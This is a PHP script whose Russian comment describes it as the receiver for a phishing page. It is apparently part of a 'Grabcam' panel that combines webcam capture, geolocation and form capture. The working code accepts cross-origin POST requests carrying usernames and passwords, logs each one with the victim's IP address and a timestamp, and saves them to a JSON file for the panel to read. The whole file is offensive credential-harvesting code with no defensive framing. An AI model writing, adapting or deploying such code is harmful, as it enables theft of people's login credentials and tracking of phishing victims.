<?php
/**
 * Принимает данные формы входа (логин/пароль) со страницы фишинга и сохраняет в form_captures.json.
 * Панель Grabcam читает этот файл через API. Одна ссылка = камера + гео + форма.
 */
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

$raw = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) {
    $data = [];
}
$username = isset($data['username']) ? trim((string)$data['username']) : '';
$password = isset($data['password']) ? trim((string)$data['password']) : '';
$ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
$ts = gmdate('Y-m-d H:i:s');

$file = __DIR__ . '/form_captures.json';
$captures = [];
if (file_exists($file)) {
    $content = @file_get_contents($file);
    if ($content !== false) {
        $decoded = @json_decode($content, true);
        if (is_array($decoded) && isset($decoded['captures'])) {
            $captures = $decoded['captures'];
        }
    }
}

if ($username !== '' || $password !== '') {
    if ($username !== '') {
        $captures[] = ['ts' => $ts, 'field' => 'username', 'value' => $username, 'ip' => $ip];
    }
    if ($password !== '') {
        $captures[] = ['ts' => $ts, 'field' => 'password', 'value' => $password, 'ip' => $ip];
    }
    $out = ['captures' => $captures];
    @file_put_contents($file, json_encode($out, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT), LOCK_EX);
}

echo json_encode(['success' => true]);
